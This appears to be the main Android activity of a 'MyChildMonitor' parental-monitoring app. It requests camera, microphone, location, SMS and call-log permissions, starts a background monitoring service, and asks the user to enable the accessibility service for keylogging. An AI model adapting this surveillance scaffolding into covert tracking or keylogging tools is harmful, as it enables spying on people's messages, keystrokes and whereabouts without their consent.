package com.xyz.child;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_PERMISSIONS = 1;
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.FOREGROUND_SERVICE_CAMERA,
        Manifest.permission.FOREGROUND_SERVICE_LOCATION,
        Manifest.permission.FOREGROUND_SERVICE_MICROPHONE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Request permissions
        if (!hasPermissions()) {
            requestPermissions();
        } else {
            startMonitoringService();
            checkAccessibilityService();
        }

        // Button to start monitoring
        Button startButton = findViewById(R.id.start_monitoring_button);
        if (startButton != null) {
            startButton.setOnClickListener(v -> {
                if (hasPermissions()) {
                    startMonitoringService();
                    checkAccessibilityService();
                    Toast.makeText(this, "Monitoring started", Toast.LENGTH_SHORT).show();
                } else {
                    requestPermissions();
                }
            });
        }
    }

    private boolean hasPermissions() {
        for (String permission : REQUIRED_PERMISSIONS) {
            // Skip storage permissions for Android 10+ if using getExternalFilesDir
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
                (permission.equals(Manifest.permission.READ_EXTERNAL_STORAGE) ||
                 permission.equals(Manifest.permission.WRITE_EXTERNAL_STORAGE))) {
                continue;
            }
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestPermissions() {
        // Filter permissions to request based on SDK version
        String[] permissionsToRequest = REQUIRED_PERMISSIONS;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Exclude storage permissions for Android 10+
            permissionsToRequest = new String[] {
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.FOREGROUND_SERVICE,
                Manifest.permission.FOREGROUND_SERVICE_CAMERA,
                Manifest.permission.FOREGROUND_SERVICE_LOCATION,
                Manifest.permission.FOREGROUND_SERVICE_MICROPHONE
            };
        }
        ActivityCompat.requestPermissions(this, permissionsToRequest, REQUEST_PERMISSIONS);
    }

    private void startMonitoringService() {
        Intent serviceIntent = new Intent(this, MonitoringService.class);
        ContextCompat.startForegroundService(this, serviceIntent);
    }

    private void checkAccessibilityService() {
        int accessibilityEnabled = 0;
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED
            );
        } catch (Settings.SettingNotFoundException e) {
            // Handle exception silently
        }
        if (accessibilityEnabled != 1) {
            new AlertDialog.Builder(this)
                .setTitle("Enable Accessibility Service")
                .setMessage("Please enable the Accessibility Service for MyChildMonitor to monitor keylogs.")
                .setPositiveButton("Go to Settings", (dialog, which) -> {
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                })
                .setNegativeButton("Cancel", null)
                .show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {
            if (hasPermissions()) {
                startMonitoringService();
                checkAccessibilityService();
                Toast.makeText(this, "Permissions granted, monitoring started", Toast.LENGTH_SHORT).show();
            } else {
                new AlertDialog.Builder(this)
                    .setTitle("Permissions Required")
                    .setMessage("This app requires camera, location, audio, SMS, call log, and storage permissions to function. Please grant all permissions.")
                    .setPositiveButton("Retry", (dialog, which) -> requestPermissions())
                    .setNegativeButton("Cancel", (dialog, which) -> 
                        Toast.makeText(this, "Required permissions denied", Toast.LENGTH_LONG).show())
                    .show();
            }
        }
    }
}
